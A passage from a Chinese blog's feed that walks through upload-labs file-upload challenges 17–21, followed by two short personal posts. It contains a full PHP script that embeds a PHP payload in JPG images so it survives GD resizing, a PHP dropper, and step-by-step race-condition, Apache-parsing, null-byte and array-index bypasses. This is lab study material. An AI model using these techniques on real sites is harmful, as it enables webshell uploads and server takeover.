class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-comment">//jpg制作脚本</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by php functions imagecopyresized() and imagecopyresampled().</span><br><span class="hljs-comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    1) Upload an arbitrary image via secured files upload script</span><br><span class="hljs-comment">    2) Save the processed image and launch:</span><br><span class="hljs-comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Since the most straightforward injection method is used, the following problems can occur:</span><br><span class="hljs-comment">    1) After the second processing the injected data may become partially corrupted.</span><br><span class="hljs-comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span><br><span class="hljs-comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Sergey Bobrov <span class="hljs-doctag">@Black</span>2Fan.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    See also:</span><br><span class="hljs-comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    */</span><br><br>    <span class="hljs-variable">$miniPayload</span> = <span class="hljs-string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;<br><br><br>    <span class="hljs-keyword">if</span>(!extension_loaded(<span class="hljs-string">&#x27;gd&#x27;</span>) || !function_exists(<span class="hljs-string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php-gd is not installed&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);<br>    &#125;<br><br>    set_error_handler(<span class="hljs-string">&quot;custom_error_handler&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$pad</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$pad</span> &lt; <span class="hljs-number">1024</span>; <span class="hljs-variable">$pad</span>++) &#123;<br>        <span class="hljs-variable">$nullbytePayloadSize</span> = <span class="hljs-variable">$pad</span>;<br>        <span class="hljs-variable">$dis</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$outStream</span> = file_get_contents(<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>        <span class="hljs-variable">$extraBytes</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readShort() != <span class="hljs-number">0xFFD8</span>) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Incorrect SOI marker&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="hljs-variable">$dis</span>-&gt;readByte() == <span class="hljs-number">0xFF</span>)) &#123;<br>            <span class="hljs-variable">$marker</span> = <span class="hljs-variable">$dis</span>-&gt;readByte();<br>            <span class="hljs-variable">$size</span> = <span class="hljs-variable">$dis</span>-&gt;readShort() - <span class="hljs-number">2</span>;<br>            <span class="hljs-variable">$dis</span>-&gt;skip(<span class="hljs-variable">$size</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$marker</span> === <span class="hljs-number">0xDA</span>) &#123;<br>                <span class="hljs-variable">$startPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek();<br>                <span class="hljs-variable">$outStreamTmp</span> = <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                    <span class="hljs-variable">$miniPayload</span> . <br>                    str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>) . <br>                    substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>);<br>                checkImage(<span class="hljs-string">&#x27;_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStreamTmp</span>, <span class="hljs-literal">TRUE</span>);<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$extraBytes</span> !== <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">while</span>((!<span class="hljs-variable">$dis</span>-&gt;eof())) &#123;<br>                        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte() === <span class="hljs-number">0xFF</span>) &#123;<br>                            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$dis</span>-&gt;readByte !== <span class="hljs-number">0x00</span>) &#123;<br>                                <span class="hljs-keyword">break</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-variable">$stopPos</span> = <span class="hljs-variable">$dis</span>-&gt;seek() - <span class="hljs-number">2</span>;<br>                    <span class="hljs-variable">$imageStreamSize</span> = <span class="hljs-variable">$stopPos</span> - <span class="hljs-variable">$startPos</span>;<br>                    <span class="hljs-variable">$outStream</span> = <br>                        substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$startPos</span>) . <br>                        <span class="hljs-variable">$miniPayload</span> . <br>                        substr(<br>                            str_repeat(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-variable">$nullbytePayloadSize</span>).<br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$startPos</span>, <span class="hljs-variable">$imageStreamSize</span>),<br>                            <span class="hljs-number">0</span>,<br>                            <span class="hljs-variable">$nullbytePayloadSize</span>+<span class="hljs-variable">$imageStreamSize</span>-<span class="hljs-variable">$extraBytes</span>) . <br>                                substr(<span class="hljs-variable">$outStream</span>, <span class="hljs-variable">$stopPos</span>);<br>                &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-variable">$correctImage</span>) &#123;<br>                    <span class="hljs-variable">$outStream</span> = <span class="hljs-variable">$outStreamTmp</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>                <span class="hljs-keyword">if</span>(checkImage(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>], <span class="hljs-variable">$outStream</span>)) &#123;<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Success!&#x27;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    unlink(<span class="hljs-string">&#x27;payload_&#x27;</span>.<span class="hljs-variable">$argv</span>[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Something\&#x27;s wrong&#x27;</span>);<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$unlink</span> = <span class="hljs-literal">FALSE</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$correctImage</span>;<br>        file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">TRUE</span>;<br>        imagecreatefromjpeg(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$unlink</span>)<br>            unlink(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$correctImage</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">custom_error_handler</span>(<span class="hljs-params"><span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$extraBytes</span>, <span class="hljs-variable">$correctImage</span>;<br>        <span class="hljs-variable">$correctImage</span> = <span class="hljs-literal">FALSE</span>;<br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$m</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>])) &#123;<br>                <span class="hljs-variable">$extraBytes</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$m</span>[<span class="hljs-number">1</span>];<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DataInputStream</span> </span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$binData</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$order</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$size</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$order</span> = <span class="hljs-literal">false</span>, <span class="hljs-variable">$fromString</span> = <span class="hljs-literal">false</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;order = <span class="hljs-variable">$order</span>;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fromString</span>) &#123;<br>                <span class="hljs-keyword">if</span>(!file_exists(<span class="hljs-variable">$filename</span>) || !is_file(<span class="hljs-variable">$filename</span>))<br>                    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;File not exists [&#x27;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&#x27;]&#x27;</span>);<br>                <span class="hljs-keyword">$this</span>-&gt;binData = file_get_contents(<span class="hljs-variable">$filename</span>);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;binData = <span class="hljs-variable">$filename</span>;<br>            &#125;<br>            <span class="hljs-keyword">$this</span>-&gt;size = strlen(<span class="hljs-keyword">$this</span>-&gt;binData);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">$this</span>-&gt;size - strlen(<span class="hljs-keyword">$this</span>-&gt;binData));<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span>(<span class="hljs-params"><span class="hljs-variable">$skip</span></span>) </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-variable">$skip</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;eof()) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$byte</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> ord(<span class="hljs-variable">$byte</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span>(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) &lt; <span class="hljs-number">2</span>) &#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;End Of File&#x27;</span>);<br>            &#125;<br>            <span class="hljs-variable">$short</span> = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">$this</span>-&gt;binData = substr(<span class="hljs-keyword">$this</span>-&gt;binData, <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;order) &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$short</span> = (ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord(<span class="hljs-variable">$short</span>[<span class="hljs-number">1</span>]);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$short</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">return</span> !<span class="hljs-keyword">$this</span>-&gt;binData||(strlen(<span class="hljs-keyword">$this</span>-&gt;binData) === <span class="hljs-number">0</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="18–条件竞争-1"><a href="#18–条件竞争-1" class="headerlink" title="18–条件竞争(1)"></a>18–条件竞争(1)</h3><p>所谓条件竞争漏洞，是一种服务器端的漏洞，由于服务器端在处理不同的请求时是并发进行的，因此如果并发处理不当或相关操作顺序设计的不合理时，将会导致此类问题的发生。</p><p>参考：<a href="http://www.javashuo.com/article/p-shhvqipp-kb.html">http://www.javashuo.com/article/p-shhvqipp-kb.html</a></p><p>18关源码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220221210214.png"></p><p>从源码可以看出，在上传图片后，该图片会直接先在服务器端储存，接着再进行检查，如果不符合条件则再删除该图片。那么我们只需要再服务器储存木马文件后，在其被删除之前访问即可触发<code>php</code>代码的执行。若是我们上传的<code>php</code>的功能是创建另一个<code>php</code>木马文件，那我们成功访问该文件后，就会生成一个一句话木马，以此来获得<code>webshell</code>。<strong>用多个线程上传文件，同时用多个线程访问上传后的文件，这样就存在竞争，就有可能在删除以前执行我们上传的文件。</strong></p><p>具体操作如下：</p><p>先上传包含如下代码的<code>php</code>文件，同时用bp抓取该数据包</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$f</span>=fopen(<span class="hljs-string">&quot;info.`php`&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br>fputs(<span class="hljs-variable">$f</span>,<span class="hljs-string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//该代码功能为创建一个名为info.php的文件，该文件包含了phpinfo()函数</span><br></code></pre></div></td></tr></table></figure><p>把该数据包放到<code>intruder</code>模块</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220162747.png"></p><p>然后清除所有变量，设置相关payload，因为我们不需要爆破某个参数，只需要不停发包即可。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220163030.png"></p><p>然后点击<code>start attack</code></p><p>同时抓取访问该<code>php</code>文件的数据包，重复上述步骤，这样即形成了不停上传<code>php</code>文件又不停地访问该<code>php</code>文件的动作，就有机会在该文件删除前访问并执行一次<code>php</code>代码，达成创建<code>php</code>木马的目的</p><p>也可以只用bp发送上传的数据包，重新用另一个浏览器手动访问该文件，不停刷新即可，实际上我就是这样才成功的，同时用bp发送这两个数据包反而都没用成功。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220165421.png"></p><p>不停访问我们上传的<code>php</code>文件直至成功。</p><p>此时服务器已执行了我们的<code>php</code>代码，创建了<code>info.php</code>文件</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220220165505.png"></p><p>成功访问<code>info.php</code></p><h3 id="19–条件竞争-2"><a href="#19–条件竞争-2" class="headerlink" title="19–条件竞争(2)"></a>19–条件竞争(2)</h3><p>注意：这关的文件上传路径有点问题，上传的文件会上传到网站根目录。建议按以下方式修改19关文件夹中的<code>myuoload.php</code>，重启服务后生效。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227141931.png"></p><p>19关源码关键处</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227141420.png"></p><p>这关上传文件后，会先对文件进行一系列检查。接着储存文件，然后对文件重命名。</p><p>另外我看到网上很多教程说上传图片马然后利用文件包含漏洞…然而我个人认为这跟条件竞争一点关系都没有，只是重复了前面卡的步骤。<strong>我个人认为下图的过关方法是错误的</strong></p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227144546.png"></p><p>网上许多关于这关的教程都是这样。首先这关没有说能使用文件包含漏洞，其次是上传图片马也只需要发包一次就行了，服务器也不会拦截，重命名对原本就是<code>jpg</code>形式的图片马也没有任何影响。这关本意应该是条件竞争，即在文件重命名前访问该文件。</p><p>思路仍然应该是不停上传<code>php</code>文件，然后在其被重命名为前访问该文件使其<code>php</code>代码生效。</p><p>该<code>php</code>文件同上一关，原理不再赘述。</p><p>这关的问题是上传后缀为<code>php</code>的文件的话会被拦截。我们只能根据白名单上传白名单内的文件，但又需要我们访问该文件时服务器能把其当作<code>php</code>文件解析。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227145820.png"></p><p>这里就利用了之前用到过的apache解析漏洞(需要注意修改配置文件<code>httpd_conf</code>)</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227150807.png"></p><p>因为apache不能解析白名单中的<code>7z</code>，所以我们可以上传<code>xx.php.7z</code>,该文件能成功上传，同时我们需要在其被重命名前访问一次。如果我们在其重命名前访问到了该文件，那么该文件会按<code>php</code>解析，执行php代码后产生一个新的php后门文件。</p><p>我本意觉得如果不停发送上传数据包的话我的虚拟机可能会被上传的大量文件弄得很卡，于是先尝试用bp不停重复发送访问该文件的数据包，同时手动上传一次这个文件，结果没能成功。</p><p>所以接下来我还是发送大量上传数据包，同时不停刷新浏览器来尝试访问该文件。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227155738.png"></p><p>最终成功执行了一次php代码，服务器生成了另一个新的php文件。同时也看到了一个原上传文件。这是因为我们成功访该文件使其被占用，暂时不能进行重命名。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227155931.png"></p><p>当我们停止访问，原上传文件被删除。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227160322.png"></p><p>最后访问…/info.php验证,成功。</p><h3 id="20–多种方法"><a href="#20–多种方法" class="headerlink" title="20–多种方法"></a>20–多种方法</h3><p>个人觉得这关用来总结和复习很适合,因为漏洞似乎都是前面遇到过的，仔细看源码，就能发现。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220221224321.png"></p><p>大致思路是抓取数据包，修改<code>save_name</code>这个参数。</p><p>从正常角度来想，怎么也要重点关注<code>save_name</code>这个参数。可发现<code>save_name</code>用来拼接其它参数，来得到一串地址，再把该文件移动到该地址处。这就与之前的上传路径可控时用的<code>%00</code>截断是一个情况，所以此处也可以使用该方法。注意需<code>php</code>版本小于5.3。</p><p>另一个容易注意到的是这关使用了<code>parhinfo</code>函数来截取文件后缀后，直接进行黑名单匹配。而我们之前所做过的黑名单匹配的关卡中，在截取了后缀之后都有好几个检查的函数，用来去除空格，点，全转小写等等，这样才来匹配黑名单。所以我们可以针对黑名单漏洞还可以上传后缀为<code>php</code>，后缀加<code>.</code>，后缀加空格，加<code>::$data</code>等方法来绕过。</p><h3 id="21–ctf题型数组绕过"><a href="#21–ctf题型数组绕过" class="headerlink" title="21–ctf题型数组绕过"></a>21–ctf题型数组绕过</h3><p>先看源码</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227172326.png"></p><p>可以看到有个检查MIME，这是第二关的内容，很容易绕过。</p><p>接下来是很多个新函数，网上搜一下便可知道作用是什么。这里源码也不复杂，一定要读懂源码。</p><p>从源码上看，若我们上传的文件名不是数组的形式，则会被<code>.</code>分成数组的形式。比如说正常情况下，用户上传了<code>cat.jpg</code>格式的文件，这里<code>.</code>前面的<code>cat</code>作为一个数组的第一个元素,<code>.</code>分割的<code>jpg</code>作为数组第二个元素。关于文件的最终命名形式的代码在这一行：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227173442.png"></p><p>意思为得到该数组的第一个元素+<code>.</code>+该数组下标为（元素个数-1）的元素（正常情况下即最后一个元素），以此作为文件名来储存。</p><p>最开始我想尝试%00截断，因为涉及到了文件路径移动，并且其拼接参数可控，但最终无果。因为这里拼接的方式是取一头一尾，所以类似<code>xx.php%00.jpg</code>的形式的文件名会被分成三个元素，再去除头尾拼接，变为<code>xx.jpg</code>，没有作用。</p><p>同理想构造特殊的文件名来绕过也不行，必须保证结尾是<code>.jpg</code>来通过白名单，但最终拼接的时候也是取这个结尾来形成文件后缀。</p><p>这关的突破点在下图中</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227174558.png"></p><p>首先是如果上传的文件名就是数组的形式的话，那么我们的这个数组的元素形式就不一定要按照每一个<code>.</code>来分元素，变数就多了。</p><p>其次是源码中两次取数组中最后一个元素的操作不同。一个是用了函数<code>end()</code>,一个是用了函数<code>count()</code>。<code>end()</code>返回数组中最后一个元素，而<code>count()</code>是返回数组元素的个数。这里是通过返回值-1取下标来得到最后一个元素。正常情况下效果是一样的，但这么多花费些功夫，也许其中就藏有玄机。</p><p>以下为破解过程(MIME部分略)：</p><p>在上传文件的数据包中复制一份有关接收<code>save_name</code>参数的数据，并在其后分别加上下标<code>[0]</code>和<code>[2]</code></p><p>并在第一段后设置文件名为<code>xx.php</code>,第二段后设置为<code>jpg</code>。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227192902.png"></p><p>这样做的目的是使得我们的文件名变成了<code>info.php</code>+<code>空</code>+<code>.jpg</code></p><p>所以<code>reset($file)</code>返回值为<code>info.php</code>，<code>end($file)</code>获取的是<code>.jpg</code>，能够通过白名单，而<code>count($file)</code>返回的值是2，<code>$file[(count)-1]</code></p><p>返回的值是<code>$file[1]</code>，即为空。</p><p>所以最后的<code>$file_name</code>拼接后变成了<code>info.php.</code>，根据Windows特性末尾的<code>.</code>被忽略，解析时被当作<code>php</code>文件处理。</p><p>上传成功，复制图片地址访问，成功解析。</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20220227191647.png"></p><hr><p>完结 : )🐣</p>]]></content>
    
    
    <categories>
      
      <category>学习</category>
      
      <category>网安</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>清理文件</title>
    <link href="/2021/10/26/%E6%B8%85%E7%90%86%E6%96%87%E4%BB%B6/"/>
    <url>/2021/10/26/%E6%B8%85%E7%90%86%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>昨天清理文件的时候看到这个笑死了🤣。</p><span id="more"></span><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211025170527.png"></p><p>（这个文件名是jxbrower）</p><p>这个博主说的很有道理。因为我也把这个文件删了，而且没事。</p><p>这个貌似是burp的缓存文件，博主90G而我只有30G，是不是顺便说明了我学web对比别人划2/3的水啊🤨</p><p>顺便推荐一个清理软件的神器，叫spacesniffer,能清楚形象的看出电脑硬盘的使用情况，软件大小还不到3M。</p><p>效果图（运行过程是动态的，速度很快，界面也蛮酷炫的）：</p><p><img src="https://gitee.com/manyeggs/drawing-bed-picgo/raw/master/images/20211026222539.png"></p><p>这个双十一整个1t的机械硬盘，不想再折磨512的G的自带硬盘了..</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
      <category>好笑</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>懒狗的自责</title>
    <link href="/2021/10/20/%E6%87%92%E7%8B%97%E7%9A%84%E8%87%AA%E8%B4%A3/"/>
    <url>/2021/10/20/%E6%87%92%E7%8B%97%E7%9A%84%E8%87%AA%E8%B4%A3/</url>
    
